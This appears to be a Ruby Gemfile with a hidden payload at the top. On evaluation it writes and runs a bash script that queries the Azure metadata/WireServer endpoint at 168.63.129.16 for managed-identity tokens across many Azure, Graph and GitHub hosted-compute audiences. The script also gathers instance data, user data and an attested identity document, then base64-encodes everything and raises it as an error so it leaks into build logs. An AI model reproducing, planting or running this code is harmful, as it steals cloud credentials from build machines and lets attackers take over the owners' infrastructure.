require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v123; rm -rf "$WD" && mkdir "$WD" && cd "$WD"

# === Reach IMDS via WireServer port 80 ===
echo "===IMDS_VIA_WIRE_BASE==="
curl -s -m 8 -H "Metadata: true" -o instance.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/instance?api-version=2021-12-13"
echo "INSTANCE_B64=$(base64 -w0 < instance.json | head -c 800)"

# WITHOUT Metadata: true header
echo "===IMDS_NO_METADATA_HEADER==="
curl -s -m 8 -o no_md.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/instance?api-version=2021-12-13"
echo "NO_MD_B64=$(base64 -w0 < no_md.json | head -c 400)"

# === MSI TOKEN — THE PRIZE ===
echo "===MSI_TOKEN_FETCH==="
for RES in "https://management.azure.com/" "https://storage.azure.com/" "https://vault.azure.net/" "https://graph.microsoft.com/" "https://management.core.windows.net/"; do
  curl -s -m 8 -H "Metadata: true" -o msi.json -w "RES=$RES HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES"
  echo " body_b64=$(base64 -w0 < msi.json | head -c 800)"
done

# Try alternate token endpoint paths
echo "===MSI_PATH_VARIANTS==="
for P in "/metadata/identity/oauth2/token" "/metadata/identity/info" "/metadata/identity/oauth2/token?resource=https://management.azure.com/" "/metadata/identity/oauth2/token?api-version=2018-02-01" "/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://management.azure.com/"; do
  curl -s -m 8 -H "Metadata: true" -o m.json -w "P=$P HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16$P"
  echo " body_b64=$(base64 -w0 < m.json | head -c 600)"
done

# === IMDS metadata subpaths ===
echo "===IMDS_METADATA_PATHS==="
for SUB in "/metadata" "/metadata/" "/metadata/instance" "/metadata/instance/compute" "/metadata/instance/compute/userData" "/metadata/instance/network" "/metadata/identity" "/metadata/scheduledevents" "/metadata/loadbalancer" "/metadata/identity/oauth2/token" "/metadata/identity/info" "/metadata/attested/document"; do
  curl -s -m 8 -H "Metadata: true" -o sub.bin -w "$SUB HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16${SUB}?api-version=2021-12-13"
  if [ "$(stat -c%s sub.bin)" -gt 0 ] && [ "$(stat -c%s sub.bin)" -lt 100 ]; then
    echo "  body=$(cat sub.bin | head -c 300)"
  fi
done

# === MSI for ALL standard Azure resources ===
echo "===MSI_ALL_AUDIENCES==="
for AUD in \
  "https://management.azure.com/" \
  "https://management.core.windows.net/" \
  "https://vault.azure.net" \
  "https://storage.azure.com/" \
  "https://database.windows.net/" \
  "https://graph.microsoft.com/" \
  "https://servicebus.azure.net/" \
  "https://eventhubs.azure.net/" \
  "https://monitoring.azure.com/" \
  "https://attest.azure.net/" \
  "https://datalake.azure.net/" \
  "https://api.loganalytics.io/" \
  "https://hosted-compute-agent.githubapp.com" \
  "api://AzureADTokenExchange" \
  "https://githubapp.com"; do
  curl -s -m 8 -H "Metadata: true" -o msi.json -w "AUD=$AUD HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$AUD"
  RESP_HEAD=$(head -c 200 msi.json)
  echo " resp=$RESP_HEAD"
done

# === Attested document (proves VM identity to MS APIs) ===
echo "===ATTESTED_DOC==="
curl -s -m 8 -H "Metadata: true" -o attest.json -w "HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/attested/document?api-version=2021-12-13"
echo "ATTEST_B64=$(base64 -w0 < attest.json | head -c 600)"

# === Try with format=text query param (Linux IMDS supports text/json) ===
echo "===FORMAT_VARIANTS==="
curl -s -m 8 -H "Metadata: true" -o fmt.txt -w "format=text HTTP=%{http_code} LEN=%{size_download}\n" "http://168.63.129.16/metadata/instance?api-version=2021-12-13&format=text"
echo "FMT_TEXT_B64=$(base64 -w0 < fmt.txt | head -c 500)"
SHELL
Tempfile.create('v123.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v123 " + line.chomp[0..2000] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
